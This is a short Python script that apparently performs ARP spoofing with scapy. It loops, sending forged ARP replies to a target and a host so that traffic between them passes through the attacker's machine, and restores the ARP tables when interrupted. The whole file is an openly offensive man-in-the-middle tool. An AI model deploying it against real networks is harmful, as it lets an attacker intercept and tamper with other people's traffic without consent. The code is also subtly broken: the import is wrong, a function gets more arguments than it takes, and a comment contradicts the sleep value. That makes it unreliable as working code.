# -*- coding: utf-8 -*-
"""
Created on Tue Nov 16 13:55:27 2021

@author: soumy_000
"""
import sys
import time
import scapy


def get_mac(ip):
    

    arp_request = scapy.ARP(pdst = ip)

    broadcast_add = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast_add / arp_request

    add_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    
    return add_list[0][1].hwsrc


def arpspoof(target_ip, spoof_ip):

    pckt = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)

    scapy.send(pckt, vrb)
    

def arprestore(target_ip, host_ip):

    target_mac = get_mac(target_ip)

    host_mac = get_mac(host_ip)

    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = host_ip, hwsrc = host_mac)

    scapy.send(packet, vrb)  
    
    

if __name__=='__main__':
    
    
    target_IP = sys.argv[2]
    
    host_IP = sys.argv[4]
    
    vrb = True                                       # to get detailed verbose information 
    
    try:
        
        while True:
            
            arpspoof(target_IP, host_IP, vrb)           # telling the `target` that we are the `host`
                
            arpspoof(host_IP, target_IP, vrb)           # telling the `host` that we are the `target`
                
            time.sleep(3)                          # sleep for one second
    
    except KeyboardInterrupt:
        
        print("CTRL+C Pressed...... Restoring the network, please wait...")
    
        arprestore(target_IP, host_IP)
    
        arprestore(host_IP, target_IP)